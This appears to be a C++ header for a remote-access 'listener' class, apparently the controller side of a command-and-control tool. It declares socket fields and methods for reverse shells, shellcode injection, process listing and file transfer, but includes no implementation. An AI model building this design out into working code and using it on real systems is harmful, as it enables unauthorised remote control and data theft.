#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <string>
#include <signal.h>
#include <thread>
using namespace std;
#ifndef LISTENER_H 
#define LISTENER_H 

class listener{
    public: 
	char PORT[6];
	int port;
	int id;
	int sockfd, new_fd, shell_fd;  
	struct addrinfo hints, *servinfo, *p;
	struct sockaddr_storage their_addr;
	socklen_t sin_size;
	struct sigaction sa;
	int yes=1;
	int status=0;
	char s[INET6_ADDRSTRLEN];
	int rv;

    listener(int port);
    int listProcess();
    void test();
    int downloadFile(string r_path, string l_path);
    int uploadFile(string l_path, string r_path);
    int reverseShell();
	void setID(int pid);
	int injectShellcode(string l_path);
	string print();
	int dropIntoShell();
};

#endif
